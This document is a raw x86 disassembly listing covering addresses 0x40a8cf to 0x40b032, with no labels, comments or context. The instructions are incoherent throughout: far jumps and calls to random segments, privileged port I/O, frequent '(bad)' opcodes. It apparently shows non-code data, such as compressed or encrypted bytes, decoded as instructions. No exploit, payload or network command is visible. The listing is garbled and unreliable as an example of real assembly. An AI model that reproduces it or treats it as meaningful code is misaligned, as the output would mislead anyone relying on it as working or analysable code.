  40a8cf:	jmp    0xa13f:0xee269580
  40a8d6:	push   ds
  40a8d7:	inc    ecx
  40a8d8:	adc    ch,BYTE PTR [ecx-0x21]
  40a8db:	test   eax,0xf5892c95
  40a8e0:	mov    fs,WORD PTR [edx+0x564e7375]
  40a8e6:	stc    
  40a8e7:	or     BYTE PTR [ebp-0x24d1c7d6],0x34
  40a8ee:	ds pusha 
  40a8f0:	xchg   ebp,eax
  40a8f1:	xchg   edi,eax
  40a8f2:	call   0x30bf:0xb84b7516
  40a8f9:	push   cs
  40a8fa:	jo     0x40a89b
  40a8fc:	dec    edi
  40a8fd:	stos   DWORD PTR es:[edi],eax
  40a8fe:	sbb    eax,edx
  40a900:	ins    BYTE PTR es:[edi],dx
  40a901:	je     0x40a910
  40a903:	fiadd  WORD PTR [eax]
  40a905:	mov    ds:0xd537f7a4,al
  40a90a:	fdiv   st,st(6)
  40a90c:	in     al,0x82
  40a90e:	jns    0x40a8ad
  40a910:	test   DWORD PTR [eax],edx
  40a912:	adc    DWORD PTR [edx+edx*8],edi
  40a915:	xchg   ebp,eax
  40a916:	popa   
  40a917:	add    edx,eax
  40a919:	mov    cl,0xe7
  40a91b:	mov    al,ds:0xe5faffdf
  40a920:	pop    esp
  40a921:	inc    esp
  40a922:	neg    DWORD PTR [edx]
  40a924:	xchg   esp,eax
  40a925:	std    
  40a926:	fcom   DWORD PTR [esi]
  40a928:	test   DWORD PTR [ecx+edi*2],ebp
  40a92b:	in     al,dx
  40a92c:	xchg   DWORD PTR fs:[esi+0x28],edx
  40a930:	mov    ds:0x2f767cb4,al
  40a935:	mov    WORD PTR [edx+0x39d51c31],es
  40a93b:	fild   WORD PTR [ebp-0x7e804a0c]
  40a941:	xchg   DWORD PTR [ebp+0x571adaf2],edi
  40a947:	stos   BYTE PTR es:[edi],al
  40a948:	add    BYTE PTR [edx],0x21
  40a94b:	in     eax,0x97
  40a94d:	pop    ss
  40a94e:	js     0x40a96d
  40a950:	in     eax,0x26
  40a952:	mov    ds:0x241efb84,al
  40a957:	xor    eax,0x50b38691
  40a95c:	jne    0x40a9a7
  40a95e:	pop    edx
  40a95f:	adc    bl,dl
  40a961:	xor    DWORD PTR [ebx-0x1c768ab4],0x1f
  40a968:	cmc    
  40a969:	and    esp,ebp
  40a96b:	mov    ds:0x434b22ed,al
  40a970:	sbb    eax,0xc9f27787
  40a975:	sti    
  40a976:	pop    ss
  40a977:	and    edx,DWORD PTR [edx+ebx*2]
  40a97a:	jo     0x40a9f4
  40a97c:	cs ds repnz xchg edx,eax
  40a980:	xchg   esi,eax
  40a981:	sub    bh,BYTE PTR [edi-0x75969b5b]
  40a987:	mov    bh,0x2f
  40a989:	and    DWORD PTR es:[edi],ebx
  40a98c:	mov    ecx,0x42d9853f
  40a991:	xor    eax,0x4364572f
  40a996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a997:	xchg   ebp,eax
  40a998:	std    
  40a999:	lds    eax,FWORD PTR ss:[edx-0x66]
  40a99d:	push   ebx
  40a99e:	int3   
  40a99f:	fcmovne st,st(1)
  40a9a1:	scas   al,BYTE PTR es:[edi]
  40a9a2:	jb     0x40a9c3
  40a9a4:	xchg   ebp,eax
  40a9a5:	jae    0x40a970
  40a9a7:	iret   
  40a9a8:	in     eax,dx
  40a9a9:	add    ah,bh
  40a9ab:	xor    eax,0xc7550fa7
  40a9b0:	dec    edx
  40a9b1:	fimul  DWORD PTR [ebx]
  40a9b3:	cld    
  40a9b4:	in     al,dx
  40a9b5:	push   es
  40a9b6:	xchg   BYTE PTR [ecx+0x120b6748],ch
  40a9bc:	dec    edx
  40a9bd:	adc    edx,DWORD PTR [esi]
  40a9bf:	ret    0x6dcf
  40a9c2:	jbe    0x40a960
  40a9c4:	loope  0x40a9f9
  40a9c6:	mov    ah,BYTE PTR [ebx+0x5e]
  40a9c9:	jo     0x40a956
  40a9cb:	cmp    edx,esi
  40a9cd:	push   ecx
  40a9ce:	jl     0x40a998
  40a9d0:	mov    ah,0x90
  40a9d2:	(bad)  
  40a9d3:	mov    al,BYTE PTR [esi+0x78]
  40a9d6:	sbb    esi,DWORD PTR [eax-0x60]
  40a9d9:	idiv   ah
  40a9db:	cmp    ebp,DWORD PTR [edx+0x6d690ffe]
  40a9e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e2:	(bad)
  40a9e5:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9e7:	out    dx,eax
  40a9e8:	dec    esi
  40a9e9:	loop   0x40aa1e
  40a9eb:	call   0x61b03a98
  40a9f0:	mov    cl,0xd5
  40a9f2:	push   esp
  40a9f3:	pushf  
  40a9f4:	das    
  40a9f5:	adc    dh,0x29
  40a9f8:	mov    WORD PTR [ebx-0x569ae08a],gs
  40a9fe:	call   0x4cf4:0x3678c9ac
  40aa05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa06:	dec    esp
  40aa07:	push   eax
  40aa08:	mov    edi,0x11e449b4
  40aa0d:	leave  
  40aa0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa0f:	inc    ecx
  40aa10:	fld    QWORD PTR [edx-0x3b]
  40aa13:	stos   DWORD PTR es:[edi],eax
  40aa14:	repz clc 
  40aa16:	dec    ecx
  40aa17:	imul   ebp,ebp,0x193cb769
  40aa1d:	mov    ch,0x6c
  40aa1f:	cli    
  40aa20:	cwde   
  40aa21:	mov    ebp,0xab1bd3df
  40aa26:	cmp    DWORD PTR [eax-0x69],ebx
  40aa29:	add    al,0x5e
  40aa2b:	fstp   QWORD PTR ds:0xb490bcb3
  40aa31:	sbb    BYTE PTR [edi-0x4f],cl
  40aa34:	es aaa 
  40aa36:	pusha  
  40aa37:	pop    ebx
  40aa38:	mov    eax,0x4bc1803b
  40aa3d:	dec    ecx
  40aa3e:	aaa    
  40aa3f:	and    DWORD PTR [ebx-0x7f840ac7],0xffffff8a
  40aa46:	cli    
  40aa47:	bnd ja 0x40aa9d
  40aa4a:	popa   
  40aa4b:	gs fld st(2)
  40aa4e:	cmp    ecx,DWORD PTR [eax-0x55]
  40aa51:	test   BYTE PTR gs:[ebp+0x73c03202],ch
  40aa58:	jmp    0x399765f3
  40aa5d:	stos   DWORD PTR es:[edi],eax
  40aa5e:	push   ds
  40aa5f:	sbb    BYTE PTR [ecx+0x1c5a5ff0],al
  40aa65:	mov    ebp,0xf90e0eec
  40aa6a:	sub    DWORD PTR [esi],0x28
  40aa6d:	fnstsw WORD PTR [edi-0x76936490]
  40aa73:	pop    edx
  40aa74:	jno    0x40aa5e
  40aa76:	or     eax,0x602bbaa1
  40aa7b:	enter  0x82f3,0xa6
  40aa7f:	leave  
  40aa80:	cmc    
  40aa81:	sahf   
  40aa82:	pop    edi
  40aa83:	mov    ebx,0x368cf39f
  40aa88:	pop    esi
  40aa89:	int3   
  40aa8a:	je     0x40aa8c
  40aa8c:	fcom   QWORD PTR [ebp-0x5b]
  40aa8f:	imul   esi,DWORD PTR [ebp+0x3339ce90],0xc79c0dee
  40aa99:	shl    esi,0xc7
  40aa9c:	xchg   ecx,eax
  40aa9d:	mov    edi,0x88b8171b
  40aaa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaa3:	jne    0x40aad4
  40aaa5:	out    0x4,al
  40aaa7:	push   ss
  40aaa8:	add    al,bl
  40aaaa:	push   esp
  40aaab:	and    ch,BYTE PTR [edx+0x45]
  40aaae:	aad    0x41
  40aab0:	lahf   
  40aab1:	sahf   
  40aab2:	cmp    ebx,DWORD PTR [esi]
  40aab4:	mov    dl,0x70
  40aab6:	fdivr  st,st(0)
  40aab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aab9:	sbb    eax,0xa55a5bbf
  40aabe:	fwait
  40aabf:	dec    esp
  40aac0:	jg     0x40ab39
  40aac2:	imul   ebp,DWORD PTR [ecx-0x2f],0x8f3c130
  40aac9:	xchg   DWORD PTR [ebx-0x56],ebp
  40aacc:	xor    al,0x36
  40aace:	jae    0x40aaf7
  40aad0:	xor    DWORD PTR [ebp-0x7ab2427b],ebx
  40aad6:	jno    0x40ab2d
  40aad8:	push   esp
  40aad9:	add    DWORD PTR [ecx-0x68bc0aa3],edx
  40aadf:	mov    bl,0xb2
  40aae1:	clc    
  40aae2:	icebp  
  40aae3:	and    al,0xb2
  40aae5:	and    al,0xb6
  40aae7:	adc    BYTE PTR [edi-0x1a],dl
  40aaea:	test   al,0x88
  40aaec:	mov    ebp,0x23d23c16
  40aaf1:	out    0x8a,eax
  40aaf3:	xor    DWORD PTR fs:[ecx-0x8],edi
  40aaf7:	cdq    
  40aaf8:	in     eax,0xe2
  40aafa:	aas    
  40aafb:	clc    
  40aafc:	fstp   TBYTE PTR [eax-0x5a307496]
  40ab02:	stc    
  40ab03:	dec    ecx
  40ab04:	loope  0x40aadd
  40ab06:	mov    BYTE PTR [ebp-0x6fc63399],bl
  40ab0c:	pop    edx
  40ab0d:	mov    dl,0xfb
  40ab0f:	push   esi
  40ab10:	push   esp
  40ab11:	imul   edx,DWORD PTR [eax+0x4c],0xbbe3d256
  40ab18:	or     al,0x95
  40ab1a:	xor    DWORD PTR [ecx*1+0xdd0a743],ecx
  40ab21:	jmp    0x40aba0
  40ab23:	pop    ecx
  40ab24:	sbb    ecx,DWORD PTR [ebp-0x4f]
  40ab27:	sub    al,0xbe
  40ab29:	mov    al,0x70
  40ab2b:	push   cs
  40ab2c:	jmp    0x40ab7e
  40ab2e:	popa   
  40ab2f:	xchg   cl,bl
  40ab31:	cmp    al,0xd9
  40ab33:	in     al,0x29
  40ab35:	(bad)  
  40ab36:	or     al,0xb
  40ab38:	stc    
  40ab39:	jae    0x40ab3f
  40ab3b:	xchg   ah,bl
  40ab3d:	inc    esi
  40ab3e:	scas   al,BYTE PTR es:[edi]
  40ab3f:	jle    0x40aacf
  40ab41:	xchg   ebx,eax
  40ab42:	cs and edx,ecx
  40ab45:	inc    edx
  40ab46:	call   0xff88:0x577735f7
  40ab4d:	ins    DWORD PTR es:[edi],dx
  40ab4e:	jmp    0xcda3645f
  40ab53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab54:	call   0xb0ab816e
  40ab59:	int3   
  40ab5a:	mov    ecx,0x243263ae
  40ab5f:	wbinvd 
  40ab61:	inc    edx
  40ab62:	dec    edi
  40ab63:	push   ebx
  40ab64:	inc    ebp
  40ab65:	out    0x7a,eax
  40ab67:	mov    bl,0x21
  40ab69:	jns    0x40ab75
  40ab6b:	pushw  es
  40ab6d:	jge    0x40aafd
  40ab6f:	test   dh,ah
  40ab71:	cdq    
  40ab72:	out    0x7,al
  40ab74:	jns    0x40ab4b
  40ab76:	xlat   BYTE PTR ds:[ebx]
  40ab77:	jp     0x40ab04
  40ab79:	jnp    0x40ab27
  40ab7b:	xchg   DWORD PTR [ebx],ebx
  40ab7d:	jno    0x40ab0b
  40ab7f:	fsubr  QWORD PTR [esi+0x74]
  40ab82:	lods   eax,DWORD PTR ds:[esi]
  40ab83:	inc    edi
  40ab84:	push   ebp
  40ab85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab86:	ins    BYTE PTR es:[edi],dx
  40ab87:	jmp    0x7570:0x6800604a
  40ab8e:	hlt    
  40ab8f:	pop    esp
  40ab90:	data16 (bad) 
  40ab92:	cmp    BYTE PTR [ecx],bl
  40ab94:	mov    dh,0x80
  40ab96:	inc    ecx
  40ab97:	into   
  40ab98:	and    DWORD PTR [esp+eiz*8+0x11],ebx
  40ab9c:	int    0xb5
  40ab9e:	in     al,dx
  40ab9f:	dec    ebp
  40aba0:	in     eax,0xb7
  40aba2:	and    BYTE PTR [esi+0xc],bl
  40aba5:	test   ch,0x56
  40aba8:	inc    edx
  40abaa:	jle    0x40ab94
  40abac:	sub    DWORD PTR ds:0xbe750cd7,0xe
  40abb3:	add    al,0x26
  40abb5:	mov    al,ds:0xd902246e
  40abba:	add    ecx,DWORD PTR [ebp-0x7c]
  40abbd:	cmp    DWORD PTR ss:[eax-0x31415b61],esp
  40abc4:	mov    dh,0xd1
  40abc6:	jmp    0x5316846b
  40abcb:	sar    DWORD PTR [eax+0x68],1
  40abce:	adc    DWORD PTR [ebx],eax
  40abd0:	cmp    BYTE PTR [edx+0x42b8a3f0],cl
  40abd6:	push   ebx
  40abd7:	jge    0x40abac
  40abd9:	pop    edx
  40abda:	inc    ebx
  40abdb:	cmp    bh,BYTE PTR cs:[ebp-0x21]
  40abdf:	adc    eax,0xeaff5d4
  40abe4:	scas   al,BYTE PTR es:[edi]
  40abe5:	mov    al,0x63
  40abe7:	ret    
  40abe8:	and    ah,0x1d
  40abeb:	mov    dl,0xc8
  40abed:	xor    bh,BYTE PTR [ebp-0x6aae16be]
  40abf3:	push   ss
  40abf4:	jg     0x40ac30
  40abf6:	fwait
  40abf7:	outs   dx,BYTE PTR ds:[esi]
  40abf8:	mov    eax,edx
  40abfa:	xchg   ecx,eax
  40abfb:	(bad)  
  40abfc:	sbb    ecx,DWORD PTR [esi-0x6a485fd7]
  40ac02:	mov    ah,0x7e
  40ac04:	xchg   esp,eax
  40ac05:	aaa    
  40ac06:	inc    ecx
  40ac07:	push   ebp
  40ac08:	add    DWORD PTR [ecx+0x6d4068c0],ebx
  40ac0e:	jae    0x40abdd
  40ac10:	mov    dl,BYTE PTR [eax+eiz*1+0x29]
  40ac14:	(bad)  
  40ac15:	jmp    0x7f932776
  40ac1a:	cmp    al,0x68
  40ac1c:	inc    edx
  40ac1d:	popf   
  40ac1e:	add    dh,0xbb
  40ac21:	lock cmp ecx,DWORD PTR [edx+0xb29ebcd]
  40ac28:	popa   
  40ac29:	or     eax,0x73cec51
  40ac2e:	dec    edi
  40ac2f:	inc    edx
  40ac30:	dec    eax
  40ac31:	mov    edi,0xc576692f
  40ac36:	and    eax,0xc36a8820
  40ac3b:	ja     0x40acb3
  40ac3d:	je     0x40ac71
  40ac3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac40:	pop    es
  40ac41:	cmc    
  40ac42:	cmp    BYTE PTR [ebp-0x6ad86474],al
  40ac48:	fwait
  40ac49:	jl     0x40abcd
  40ac4b:	lea    ecx,[ebx]
  40ac4d:	loopne 0x40ac8b
  40ac4f:	(bad)  
  40ac50:	ror    eax,0x6d
  40ac53:	xchg   DWORD PTR [ebp+0x34],ebx
  40ac56:	adc    BYTE PTR [edx-0x2a],dl
  40ac59:	mov    ebx,DWORD PTR [eax]
  40ac5b:	push   esi
  40ac5c:	jnp    0x40acd5
  40ac5e:	add    DWORD PTR [esi],0x3ebc1375
  40ac64:	xor    cl,BYTE PTR [ebx]
  40ac66:	inc    ebx
  40ac67:	dec    eax
  40ac68:	loopne 0x40aca2
  40ac6a:	pop    ds
  40ac6b:	test   BYTE PTR [esi+0x7901d178],dl
  40ac71:	and    BYTE PTR [ebp-0x4b5a67a3],cl
  40ac77:	in     eax,0xd1
  40ac79:	or     DWORD PTR [eax],edx
  40ac7b:	aad    0x9c
  40ac7d:	add    ebx,DWORD PTR [ecx+0x6f]
  40ac80:	ds retf 
  40ac82:	into   
  40ac83:	and    ecx,esi
  40ac85:	mov    es,WORD PTR [eax-0x43a3062]
  40ac8b:	mov    bh,0x5c
  40ac8d:	adc    al,0xe0
  40ac8f:	hlt    
  40ac90:	adc    al,BYTE PTR [ebp+0x5488cc42]
  40ac96:	mov    bh,0xb9
  40ac98:	ja     0x40ad18
  40ac9a:	shl    BYTE PTR [esi+0x40],0x3
  40ac9e:	pusha  
  40ac9f:	enter  0x57b7,0x3
  40aca3:	xchg   ebx,eax
  40aca4:	stos   DWORD PTR es:[edi],eax
  40aca5:	and    cl,BYTE PTR [esi]
  40aca7:	and    dl,bh
  40aca9:	stc    
  40acaa:	sub    DWORD PTR ds:[eax],0xb2ef5ac5
  40acb1:	(bad)  
  40acb2:	in     al,0xaa
  40acb4:	jg     0x40ac86
  40acb6:	les    esi,FWORD PTR [edi]
  40acb8:	sub    al,0x62
  40acba:	jge    0x40aced
  40acbc:	sub    eax,0xac9a9327
  40acc1:	sub    edx,ecx
  40acc3:	shl    BYTE PTR fs:[esi-0x4a5444f3],0x35
  40accb:	sar    edx,0x96
  40acce:	inc    eax
  40accf:	mov    ds:0x15135583,al
  40acd4:	rcl    DWORD PTR [ebp-0x3ff69186],cl
  40acda:	push   ds
  40acdb:	ret    
  40acdc:	and    al,0x58
  40acde:	sbb    eax,0x91d26490
  40ace3:	xchg   esi,eax
  40ace4:	repnz (bad) 
  40ace6:	fdivrp st(3),st
  40ace8:	mov    ecx,0x1a4d7a53
  40aced:	cli    
  40acee:	push   cs
  40acef:	mov    ch,0xb5
  40acf1:	or     eax,0x1b4dd7d2
  40acf6:	aam    0x93
  40acf8:	or     ecx,eax
  40acfa:	shl    DWORD PTR [edx-0x356eb977],cl
  40ad00:	pop    ecx
  40ad01:	cmp    edx,DWORD PTR [ecx]
  40ad03:	inc    esp
  40ad04:	ds sbb eax,0x67f661ac
  40ad0a:	inc    ebx
  40ad0b:	pop    ecx
  40ad0c:	clc    
  40ad0d:	in     eax,0x78
  40ad0f:	(bad)  
  40ad10:	les    edi,FWORD PTR [edi-0x17]
  40ad13:	punpckldq mm3,DWORD PTR [esi]
  40ad16:	gs psraw mm6,mm7
  40ad1a:	or     ebx,DWORD PTR [ecx]
  40ad1c:	sub    al,0x4f
  40ad1e:	jge    0x40acff
  40ad20:	push   esp
  40ad21:	xor    ch,BYTE PTR [edi]
  40ad23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad24:	lods   al,BYTE PTR ds:[esi]
  40ad25:	call   0x91002464
  40ad2a:	mov    ecx,0x660c9ce5
  40ad2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad30:	xchg   edx,eax
  40ad31:	ss aam 0xeb
  40ad34:	push   ecx
  40ad35:	or     ebp,DWORD PTR gs:[edi-0x40f08387]
  40ad3c:	pop    eax
  40ad3d:	scas   eax,DWORD PTR es:[edi]
  40ad3e:	in     eax,dx
  40ad3f:	jp     0x40ad5b
  40ad41:	inc    ebx
  40ad42:	stos   DWORD PTR es:[edi],eax
  40ad43:	dec    edx
  40ad44:	div    BYTE PTR [ebx]
  40ad46:	fisubr WORD PTR [ebx]
  40ad48:	push   edi
  40ad49:	int    0x30
  40ad4b:	dec    DWORD PTR [ecx+edx*8]
  40ad4e:	xor    ecx,DWORD PTR [edi+0x408f5e43]
  40ad54:	push   0xc11b0a58
  40ad59:	jb     0x40adc5
  40ad5b:	mov    ch,0xd1
  40ad5d:	dec    esp
  40ad5e:	test   BYTE PTR [edi+0xec90b78],bh
  40ad64:	pushf  
  40ad65:	repz fwait
  40ad67:	mov    ecx,0x16f29141
  40ad6c:	inc    ebx
  40ad6d:	xor    BYTE PTR [edx],0xf1
  40ad70:	(bad)  
  40ad71:	outs   dx,DWORD PTR ds:[esi]
  40ad72:	fldenv ds:0x4b2197f2
  40ad78:	dec    esi
  40ad79:	retf   
  40ad7a:	(bad)  [ecx-0x1f47ab71]
  40ad80:	add    BYTE PTR [edi+eax*2],al
  40ad83:	jg     0x40ad39
  40ad85:	add    al,0xc2
  40ad87:	jmp    0x40ad28
  40ad89:	imul   edi,DWORD PTR [ecx],0xffffffce
  40ad8c:	xchg   edi,eax
  40ad8d:	dec    esi
  40ad8e:	inc    ebx
  40ad8f:	out    0x25,eax
  40ad91:	xchg   ebp,eax
  40ad92:	push   ss
  40ad93:	and    eax,edi
  40ad95:	jge    0x40ad1c
  40ad97:	pusha  
  40ad98:	add    DWORD PTR ss:[edx+0x6b],edx
  40ad9c:	mov    eax,0xa26b9188
  40ada1:	push   edx
  40ada2:	sub    al,0xe4
  40ada4:	dec    esp
  40ada5:	jae    0x40ad44
  40ada7:	xlat   BYTE PTR ds:[ebx]
  40ada8:	sbb    ah,BYTE PTR [ebp-0x41170a4b]
  40adae:	jp     0x40ae1e
  40adb0:	hlt    
  40adb1:	pop    edi
  40adb2:	inc    ebp
  40adb3:	lds    ebx,FWORD PTR [ebp-0x1c]
  40adb6:	or     ch,BYTE PTR [esi-0x2405c544]
  40adbc:	pop    ebp
  40adbd:	ficomp DWORD PTR [esi+0x75af94f4]
  40adc3:	mov    bl,0xf8
  40adc5:	aam    0x4b
  40adc7:	in     eax,dx
  40adc8:	test   al,0x35
  40adca:	jp     0x40ae45
  40adcc:	in     eax,0x6
  40adce:	jne    0x40ad62
  40add0:	lea    edi,ds:0xa9724b43
  40add6:	test   DWORD PTR [edx+0x18cea295],0x1f6f0348
  40ade0:	mov    gs,WORD PTR [esi+0x4bebd5b1]
  40ade6:	sub    esp,eax
  40ade8:	cwde   
  40ade9:	repnz in al,dx
  40adeb:	and    BYTE PTR [edi+0x4a74e56b],0x4d
  40adf2:	jmp    0xb879:0x56e3515a
  40adf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adfa:	xor    ebx,DWORD PTR [eax]
  40adfc:	loopne 0x40adba
  40adfe:	sbb    eax,0x80db4b7f
  40ae03:	mov    bl,ch
  40ae05:	inc    esi
  40ae06:	dec    ebx
  40ae07:	lea    ebp,[eax-0x5]
  40ae0a:	add    al,0x89
  40ae0c:	jnp    0x40ad9c
  40ae0e:	inc    edx
  40ae0f:	adc    eax,0x334c73db
  40ae14:	sub    DWORD PTR [edi+0x74],ebp
  40ae17:	lods   al,BYTE PTR ds:[esi]
  40ae18:	inc    edx
  40ae19:	push   esi
  40ae1a:	mov    ds:0x8074b297,eax
  40ae1f:	or     ebp,ecx
  40ae21:	jbe    0x40ada5
  40ae23:	pop    edx
  40ae24:	jecxz  0x40add7
  40ae26:	jecxz  0x40ae22
  40ae28:	sbb    ah,BYTE PTR [eax-0x3b]
  40ae2b:	aas    
  40ae2c:	(bad)  
  40ae2d:	or     edx,DWORD PTR [edi-0x20]
  40ae30:	pop    edx
  40ae31:	mov    ah,0x92
  40ae33:	addr16 push 0xffffffe7
  40ae36:	aad    0x73
  40ae38:	and    BYTE PTR [esi-0x3a14597c],dl
  40ae3e:	dec    ecx
  40ae3f:	js     0x40ae1f
  40ae41:	ret    
  40ae42:	push   ds
  40ae43:	sbb    al,0xbe
  40ae45:	add    eax,esp
  40ae47:	jbe    0x40ae9a
  40ae49:	dec    edi
  40ae4a:	daa    
  40ae4b:	mov    edx,ecx
  40ae4d:	test   edx,ebp
  40ae4f:	add    edi,eax
  40ae51:	pop    ebp
  40ae52:	xor    al,0xed
  40ae54:	inc    ebp
  40ae55:	pop    ss
  40ae56:	das    
  40ae57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae58:	pop    ecx
  40ae59:	mov    edx,0x170f33ed
  40ae5e:	mul    ch
  40ae60:	jg     0x40ae53
  40ae62:	and    eax,0x6949453a
  40ae67:	mov    dl,0x5c
  40ae69:	add    al,0x62
  40ae6b:	dec    esp
  40ae6c:	fisub  DWORD PTR ds:0xe355c66b
  40ae72:	std    
  40ae73:	leave  
  40ae74:	je     0x40aec8
  40ae76:	je     0x40aec7
  40ae78:	std    
  40ae79:	outs   dx,BYTE PTR ds:[esi]
  40ae7a:	sbb    edx,DWORD PTR [edi-0x61]
  40ae7d:	das    
  40ae7e:	mov    ah,0x79
  40ae80:	adc    BYTE PTR [edx],bl
  40ae82:	or     BYTE PTR ds:0xdf0c619e,bh
  40ae88:	retf   0x85cc
  40ae8b:	mov    es,WORD PTR [edi]
  40ae8d:	(bad)  [edx+0x7d]
  40ae90:	ror    DWORD PTR [edi-0x1],0xb1
  40ae94:	rcr    DWORD PTR [ecx],1
  40ae96:	fimul  WORD PTR [esi-0x68]
  40ae99:	(bad)  
  40ae9a:	out    0x8f,al
  40ae9c:	icebp  
  40ae9d:	dec    ebx
  40ae9e:	fs mov edi,0xa01dee8d
  40aea4:	push   edx
  40aea5:	xchg   ch,bl
  40aea7:	data16 fdivr QWORD PTR [edx+0xd]
  40aeab:	repnz pop eax
  40aead:	lods   eax,DWORD PTR ds:[esi]
  40aeae:	fprem  
  40aeb0:	mov    edi,0x3e39b03a
  40aeb5:	push   cs
  40aeb6:	mov    edx,0xea7cab16
  40aebb:	loope  0x40ae4e
  40aebd:	hlt    
  40aebe:	dec    edx
  40aebf:	imul   ecx,DWORD PTR [eax],0xffffffe2
  40aec2:	aam    0x57
  40aec4:	test   ebx,0x9262916f
  40aeca:	inc    esp
  40aecb:	mov    al,ds:0x99d3d8f
  40aed0:	mov    al,ds:0xdb0a1838
  40aed5:	sbb    al,0xca
  40aed7:	push   ss
  40aed8:	das    
  40aed9:	xchg   ecx,eax
  40aeda:	xlat   BYTE PTR ds:[ebx]
  40aedb:	jle    0x40af55
  40aedd:	ja     0x40ae81
  40aedf:	repz rcr al,1
  40aee2:	cmp    al,0xb2
  40aee4:	or     dl,BYTE PTR [edi-0x55]
  40aee7:	adc    DWORD PTR [edx+eiz*4+0x16],esp
  40aeeb:	cmp    ax,0xdeed
  40aeef:	mov    bl,dh
  40aef1:	popa   
  40aef2:	out    dx,eax
  40aef3:	or     esp,ecx
  40aef5:	iret   
  40aef6:	(bad)  
  40aef7:	shl    DWORD PTR [ebp-0x693b6da7],1
  40aefd:	push   eax
  40aefe:	(bad)  
  40aeff:	aad    0x6c
  40af01:	push   0x5a
  40af03:	sbb    eax,0x3d41ddf3
  40af08:	jns    0x40aeaf
  40af0a:	sbb    ebx,DWORD PTR [esi+0x24]
  40af0d:	add    al,0xb8
  40af0f:	or     eax,DWORD PTR [edx-0x3b]
  40af12:	push   es
  40af13:	inc    edi
  40af14:	fcomp  DWORD PTR [edi]
  40af16:	inc    ebp
  40af17:	outs   dx,DWORD PTR ds:[esi]
  40af18:	lea    ebp,[ecx+0x654d48cd]
  40af1e:	adc    ebx,DWORD PTR [esi+0x87c53b9]
  40af24:	mov    ebx,0xc90a0ec2
  40af29:	addr16 mov edi,0xe33e1cc1
  40af2f:	mov    ebx,0x4d5e3ae2
  40af34:	(bad)  
  40af35:	leave  
  40af36:	ja     0x40af80
  40af38:	in     eax,0x2b
  40af3a:	push   ss
  40af3b:	or     al,0xc2
  40af3d:	bswap  ebx
  40af3f:	xor    eax,0xd41f0bc7
  40af44:	push   esp
  40af45:	adc    eax,0x24e10ab0
  40af4a:	fdiv   DWORD PTR [ebx]
  40af4c:	addr16 data16 adc al,0x42
  40af50:	sub    ecx,DWORD PTR [eax+0x7577f14f]
  40af56:	mov    ds:0xd74408e,eax
  40af5b:	dec    ebp
  40af5c:	add    DWORD PTR [eax-0x3a96d3eb],0xffffffb9
  40af63:	retf   
  40af64:	mov    edx,DWORD PTR [ebx]
  40af66:	call   0xb8b4:0x9f004b6a
  40af6d:	push   0x199c4479
  40af72:	dec    ebx
  40af73:	retf   
  40af74:	fsubr  DWORD PTR [edx-0x2a]
  40af77:	call   0x27a4a6c
  40af7c:	imul   esi,DWORD PTR [edx],0xad1dc92
  40af82:	call   0xc12d24e7
  40af87:	inc    esi
  40af88:	sti    
  40af89:	jae    0x40af89
  40af8b:	sbb    DWORD PTR cs:[esp+edi*1],ebx
  40af8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af90:	out    0xcf,eax
  40af92:	retf   0x8aaf
  40af95:	loop   0x40afa7
  40af97:	adc    al,0x61
  40af99:	push   cs
  40af9a:	push   ebp
  40af9b:	fild   WORD PTR [ecx+0x7b40a44f]
  40afa1:	dec    edi
  40afa2:	repnz int3 
  40afa4:	es dec edx
  40afa6:	add    eax,0x586c1e11
  40afab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afac:	and    ebx,edi
  40afae:	rol    al,0x15
  40afb1:	fnstcw WORD PTR [edx]
  40afb3:	mov    cl,0xbd
  40afb5:	fdivrp st(3),st
  40afb7:	jno    0x40b035
  40afb9:	xchg   edi,eax
  40afba:	arpl   WORD PTR [ebp+0x21],di
  40afbd:	add    eax,ecx
  40afbf:	mov    bl,0x71
  40afc1:	jae    0x40afb2
  40afc3:	aam    0x49
  40afc5:	gs repnz sti 
  40afc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc9:	sahf   
  40afca:	mov    ecx,0x41e4c8c2
  40afcf:	add    ebp,ecx
  40afd1:	inc    ecx
  40afd2:	ins    BYTE PTR es:[edi],dx
  40afd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afd4:	loope  0x40b02d
  40afd6:	rol    DWORD PTR [eax+0x2b18d074],0x0
  40afdd:	mov    al,ds:0xad2db84a
  40afe2:	sub    eax,0xf53f356a
  40afe7:	mov    edx,DWORD PTR [esi-0x2c0c937a]
  40afed:	pop    es
  40afee:	out    0xfa,eax
  40aff0:	test   DWORD PTR [esi+0x3a],ecx
  40aff3:	add    al,0x4
  40aff5:	lea    ecx,ds:0xd01ff994
  40affb:	jge    0x40b070
  40affd:	jecxz  0x40afbb
  40afff:	out    dx,al
  40b000:	cwde   
  40b001:	mov    ds:0xf13dac3b,eax
  40b006:	into   
  40b007:	je     0x40b026
  40b009:	mov    eax,0xf196443
  40b00e:	imul   ebp,ebx,0xe41b3580
  40b014:	pop    ebp
  40b015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b016:	sti    
  40b017:	xlat   BYTE PTR ds:[ebx]
  40b018:	in     eax,0xf
  40b01a:	sar    DWORD PTR [eax],1
  40b01c:	pop    edx
  40b01d:	push   edx
  40b01e:	mov    ch,0x7f
  40b020:	gs iret 
  40b022:	imul   esp,DWORD PTR [ecx+0x53a46db],0xacd976e5
  40b02c:	rol    BYTE PTR [ebp+0x5276d081],cl
  40b032:	adc    DWORD PTR [edx+0x1b8c9298],0xffffffa8
